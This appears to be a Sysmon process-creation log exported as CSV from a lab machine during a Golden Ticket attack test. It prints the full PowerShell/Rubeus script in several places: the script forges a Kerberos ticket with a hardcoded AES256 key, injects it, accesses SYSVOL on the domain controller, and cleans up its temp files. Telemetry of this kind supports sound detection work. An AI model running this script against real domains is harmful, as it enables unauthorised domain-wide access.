Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

cmd.exe /c \""""$Env:temp\rubeus.exe\"""" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\') + \"""".\"""" + \""""$ENV:userdnsdomain\"""") /printcmd /outfile:golden
$filename = (Get-ChildItem | ? {$_.Name.startswith(\""""golden_\"""")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name

# create batch file with commands to run in a separate \""""runas /netonly\"""" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture \""""runas /netonly\"""" output otherwise
@\""""
>%%TEMP%%\golden.txt 2>&1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  cd %%temp%%
  \""""$Env:temp\rubeus.exe\"""" ptt /ticket:kirbifile

  echo.
  echo Requesting SYSVOL:
  dir \\$($ENV:logonserver.TrimStart('\') + \"""".\"""" + \""""$ENV:userdnsdomain\"""")\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
\""""@ -Replace \""""kirbifile\"""", $filename | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo \""""foo\"""" | runas /netonly /user:fake \""""$env:TEMP\golden.bat\"""" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path \""""$env:TEMP\golden.txt\"""" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,,1,9474,,10.0.22621.2215 (WinBuild.160101.0800),"MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:16.011

ProcessGuid: {fda94052-43ac-658d-7702-000000000b00}

ProcessId: 3524

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

cmd.exe /c \""""$Env:temp\rubeus.exe\"""" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\') + \"""".\"""" + \""""$ENV:userdnsdomain\"""") /printcmd /outfile:golden
$filename = (Get-ChildItem | ? {$_.Name.startswith(\""""golden_\"""")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name

# create batch file with commands to run in a separate \""""runas /netonly\"""" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture \""""runas /netonly\"""" output otherwise
@\""""
>%%TEMP%%\golden.txt 2>&1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  cd %%temp%%
  \""""$Env:temp\rubeus.exe\"""" ptt /ticket:kirbifile

  echo.
  echo Requesting SYSVOL:
  dir \\$($ENV:logonserver.TrimStart('\') + \"""".\"""" + \""""$ENV:userdnsdomain\"""")\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
\""""@ -Replace \""""kirbifile\"""", $filename | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo \""""foo\"""" | runas /netonly /user:fake \""""$env:TEMP\golden.bat\"""" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path \""""$env:TEMP\golden.txt\"""" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User",Info,PowerShell.EXE,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-b87a-658c-2702-000000000b00},5076,WINDEV2309EVAL\User,{fda94052-43ac-658d-7702-000000000b00},7044,3524,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:45:16.0130025Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:45:16.011,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:45:16.0130025Z""/>
      <EventRecordID>9474</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:45:16.011</Data>
      <Data Name=""ProcessGuid"">{fda94052-43ac-658d-7702-000000000b00}</Data>
      <Data Name=""ProcessId"">3524</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2215 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

cmd.exe /c \""""$Env:temp\rubeus.exe\"""" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\') + \"""".\"""" + \""""$ENV:userdnsdomain\"""") /printcmd /outfile:golden
$filename = (Get-ChildItem | ? {$_.Name.startswith(\""""golden_\"""")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name

# create batch file with commands to run in a separate \""""runas /netonly\"""" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture \""""runas /netonly\"""" output otherwise
@\""""
&gt;%%TEMP%%\golden.txt 2&gt;&amp;1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  cd %%temp%%
  \""""$Env:temp\rubeus.exe\"""" ptt /ticket:kirbifile

  echo.
  echo Requesting SYSVOL:
  dir \\$($ENV:logonserver.TrimStart('\') + \"""".\"""" + \""""$ENV:userdnsdomain\"""")\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
\""""@ -Replace \""""kirbifile\"""", $filename | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo \""""foo\"""" | runas /netonly /user:fake \""""$env:TEMP\golden.bat\"""" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path \""""$env:TEMP\golden.txt\"""" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b87a-658c-2702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5076</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:16.011

ProcessGuid: {fda94052-43ac-658d-7702-000000000b00}

ProcessId: 3524

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

cmd.exe /c \""""$Env:temp\rubeus.exe\"""" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\') + \"""".\"""" + \""""$ENV:userdnsdomain\"""") /printcmd /outfile:golden
$filename = (Get-ChildItem | ? {$_.Name.startswith(\""""golden_\"""")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name

# create batch file with commands to run in a separate \""""runas /netonly\"""" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture \""""runas /netonly\"""" output otherwise
@\""""
&gt;%%TEMP%%\golden.txt 2&gt;&amp;1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  cd %%temp%%
  \""""$Env:temp\rubeus.exe\"""" ptt /ticket:kirbifile

  echo.
  echo Requesting SYSVOL:
  dir \\$($ENV:logonserver.TrimStart('\') + \"""".\"""" + \""""$ENV:userdnsdomain\"""")\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
\""""@ -Replace \""""kirbifile\"""", $filename | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo \""""foo\"""" | runas /netonly /user:fake \""""$env:TEMP\golden.bat\"""" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path \""""$env:TEMP\golden.txt\"""" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,klist,Microsoft Corporation,WinDev2309Eval,,C:\Windows\System32\,Tool for managing the Kerberos ticket cache,,,,,,,1,9473,,10.0.22621.1 (WinBuild.160101.0800),"MD5=3AA443B428CD290BD8415E7FDD5FB82A,SHA256=430E7845BB559CBAB9BEA4F87F86B14ACDC33F596EED7300A0208C9D0F99829E,IMPHASH=85207CDD890ACE87BF7EF7906D90318B",C:\Windows\System32\klist.exe,,Medium,0x8000000000000000,Information,{fda94052-43a9-658d-2520-cd0000000000},0xcd2025,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:14.284

ProcessGuid: {fda94052-43aa-658d-7602-000000000b00}

ProcessId: 10980

Image: C:\Windows\System32\klist.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Tool for managing the Kerberos ticket cache

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: klist.exe

CommandLine: klist

CurrentDirectory: C:\Windows\System32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-43a9-658d-2520-cd0000000000}

LogonId: 0xCD2025

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=3AA443B428CD290BD8415E7FDD5FB82A,SHA256=430E7845BB559CBAB9BEA4F87F86B14ACDC33F596EED7300A0208C9D0F99829E,IMPHASH=85207CDD890ACE87BF7EF7906D90318B

ParentProcessGuid: {fda94052-43a9-658d-7002-000000000b00}

ParentProcessId: 8144

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: C:\Windows\system32\cmd.exe /c C:\Users\User\AppData\Local\Temp\golden.bat

ParentUser: WINDEV2309EVAL\User",Info,klist.exe,C:\Windows\system32\cmd.exe /c C:\Users\User\AppData\Local\Temp\golden.bat,C:\Windows\System32\cmd.exe,{fda94052-43a9-658d-7002-000000000b00},8144,WINDEV2309EVAL\User,{fda94052-43aa-658d-7602-000000000b00},7044,10980,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:45:14.2885047Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:45:14.284,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:45:14.2885047Z""/>
      <EventRecordID>9473</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:45:14.284</Data>
      <Data Name=""ProcessGuid"">{fda94052-43aa-658d-7602-000000000b00}</Data>
      <Data Name=""ProcessId"">10980</Data>
      <Data Name=""Image"">C:\Windows\System32\klist.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Tool for managing the Kerberos ticket cache</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">klist.exe</Data>
      <Data Name=""CommandLine"">klist</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\System32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-43a9-658d-2520-cd0000000000}</Data>
      <Data Name=""LogonId"">0xcd2025</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=3AA443B428CD290BD8415E7FDD5FB82A,SHA256=430E7845BB559CBAB9BEA4F87F86B14ACDC33F596EED7300A0208C9D0F99829E,IMPHASH=85207CDD890ACE87BF7EF7906D90318B</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-43a9-658d-7002-000000000b00}</Data>
      <Data Name=""ParentProcessId"">8144</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">C:\Windows\system32\cmd.exe /c C:\Users\User\AppData\Local\Temp\golden.bat</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:14.284

ProcessGuid: {fda94052-43aa-658d-7602-000000000b00}

ProcessId: 10980

Image: C:\Windows\System32\klist.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Tool for managing the Kerberos ticket cache

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: klist.exe

CommandLine: klist

CurrentDirectory: C:\Windows\System32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-43a9-658d-2520-cd0000000000}

LogonId: 0xCD2025

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=3AA443B428CD290BD8415E7FDD5FB82A,SHA256=430E7845BB559CBAB9BEA4F87F86B14ACDC33F596EED7300A0208C9D0F99829E,IMPHASH=85207CDD890ACE87BF7EF7906D90318B

ParentProcessGuid: {fda94052-43a9-658d-7002-000000000b00}

ParentProcessId: 8144

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: C:\Windows\system32\cmd.exe /c C:\Users\User\AppData\Local\Temp\golden.bat

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,klist  purge,Microsoft Corporation,WinDev2309Eval,,C:\Windows\System32\,Tool for managing the Kerberos ticket cache,,,,,,,1,9472,,10.0.22621.1 (WinBuild.160101.0800),"MD5=3AA443B428CD290BD8415E7FDD5FB82A,SHA256=430E7845BB559CBAB9BEA4F87F86B14ACDC33F596EED7300A0208C9D0F99829E,IMPHASH=85207CDD890ACE87BF7EF7906D90318B",C:\Windows\System32\klist.exe,,Medium,0x8000000000000000,Information,{fda94052-43a9-658d-2520-cd0000000000},0xcd2025,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:14.254

ProcessGuid: {fda94052-43aa-658d-7502-000000000b00}

ProcessId: 9564

Image: C:\Windows\System32\klist.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Tool for managing the Kerberos ticket cache

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: klist.exe

CommandLine: klist  purge

CurrentDirectory: C:\Windows\System32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-43a9-658d-2520-cd0000000000}

LogonId: 0xCD2025

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=3AA443B428CD290BD8415E7FDD5FB82A,SHA256=430E7845BB559CBAB9BEA4F87F86B14ACDC33F596EED7300A0208C9D0F99829E,IMPHASH=85207CDD890ACE87BF7EF7906D90318B

ParentProcessGuid: {fda94052-43a9-658d-7002-000000000b00}

ParentProcessId: 8144

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: C:\Windows\system32\cmd.exe /c C:\Users\User\AppData\Local\Temp\golden.bat

ParentUser: WINDEV2309EVAL\User",Info,klist.exe,C:\Windows\system32\cmd.exe /c C:\Users\User\AppData\Local\Temp\golden.bat,C:\Windows\System32\cmd.exe,{fda94052-43a9-658d-7002-000000000b00},8144,WINDEV2309EVAL\User,{fda94052-43aa-658d-7502-000000000b00},7044,9564,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:45:14.2560815Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:45:14.254,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:45:14.2560815Z""/>
      <EventRecordID>9472</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:45:14.254</Data>
      <Data Name=""ProcessGuid"">{fda94052-43aa-658d-7502-000000000b00}</Data>
      <Data Name=""ProcessId"">9564</Data>
      <Data Name=""Image"">C:\Windows\System32\klist.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Tool for managing the Kerberos ticket cache</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">klist.exe</Data>
      <Data Name=""CommandLine"">klist  purge</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\System32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-43a9-658d-2520-cd0000000000}</Data>
      <Data Name=""LogonId"">0xcd2025</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=3AA443B428CD290BD8415E7FDD5FB82A,SHA256=430E7845BB559CBAB9BEA4F87F86B14ACDC33F596EED7300A0208C9D0F99829E,IMPHASH=85207CDD890ACE87BF7EF7906D90318B</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-43a9-658d-7002-000000000b00}</Data>
      <Data Name=""ParentProcessId"">8144</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">C:\Windows\system32\cmd.exe /c C:\Users\User\AppData\Local\Temp\golden.bat</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:14.254

ProcessGuid: {fda94052-43aa-658d-7502-000000000b00}

ProcessId: 9564

Image: C:\Windows\System32\klist.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Tool for managing the Kerberos ticket cache

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: klist.exe

CommandLine: klist  purge

CurrentDirectory: C:\Windows\System32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-43a9-658d-2520-cd0000000000}

LogonId: 0xCD2025

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=3AA443B428CD290BD8415E7FDD5FB82A,SHA256=430E7845BB559CBAB9BEA4F87F86B14ACDC33F596EED7300A0208C9D0F99829E,IMPHASH=85207CDD890ACE87BF7EF7906D90318B

ParentProcessGuid: {fda94052-43a9-658d-7002-000000000b00}

ParentProcessId: 8144

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: C:\Windows\system32\cmd.exe /c C:\Users\User\AppData\Local\Temp\golden.bat

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe"" --type=utility --utility-sub-type=unzip.mojom.Unzipper --lang=en-US --service-sandbox-type=service --noerrdialogs --user-data-dir=""C:\Users\User\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=Widgets.exe --webview-exe-version=421.20070.1820.0 --embedded-browser-webview=1 --mojo-platform-channel-handle=4772 --field-trial-handle=1784,i,2295490780030403019,2821906385101450000,262144 --enable-features=MojoIpcz,UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend --variations-seed-version /prefetch:8 /pfhostedapp:017373b2a5c4ead1a08d36a47bf86195c1909a61",Microsoft Corporation,WinDev2309Eval,,C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\,Microsoft Edge WebView2,,,,,,,1,9471,,120.0.2210.91,"MD5=8094151812FF45079C840986A0489C78,SHA256=6A4E8A5761C51840CE988C9241B514028A5E45FDB386B072DB0447E3961E3A06,IMPHASH=EA4CA1F8E3B3D9373D39C13FD1348A63",C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe,,Low,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:13.692

ProcessGuid: {fda94052-43a9-658d-7402-000000000b00}

ProcessId: 6156

Image: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe

FileVersion: 120.0.2210.91

Description: Microsoft Edge WebView2

Product: Microsoft Edge WebView2

Company: Microsoft Corporation

OriginalFileName: msedgewebview2.exe

CommandLine: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe"" --type=utility --utility-sub-type=unzip.mojom.Unzipper --lang=en-US --service-sandbox-type=service --noerrdialogs --user-data-dir=""C:\Users\User\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=Widgets.exe --webview-exe-version=421.20070.1820.0 --embedded-browser-webview=1 --mojo-platform-channel-handle=4772 --field-trial-handle=1784,i,2295490780030403019,2821906385101450000,262144 --enable-features=MojoIpcz,UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend --variations-seed-version /prefetch:8 /pfhostedapp:017373b2a5c4ead1a08d36a47bf86195c1909a61

CurrentDirectory: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Low

Hashes: MD5=8094151812FF45079C840986A0489C78,SHA256=6A4E8A5761C51840CE988C9241B514028A5E45FDB386B072DB0447E3961E3A06,IMPHASH=EA4CA1F8E3B3D9373D39C13FD1348A63

ParentProcessGuid: {fda94052-b85d-658c-1702-000000000b00}

ParentProcessId: 4184

ParentImage: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe

ParentCommandLine: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=Widgets.exe --webview-exe-version=421.20070.1820.0 --user-data-dir=""C:\Users\User\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --disk-cache-size=52428800 --edge-webview-is-background --enable-features=MojoIpcz,msWebView2TreatAppSuspendAsDeviceSuspend,UseNativeThreadPool,UseBackgroundNativeThreadPool --lang=en-US --accept-lang=en-US --mojo-named-platform-channel-pipe=8112.2288.17893317180732402091 /pfhostedapp:017373b2a5c4ead1a08d36a47bf86195c1909a61

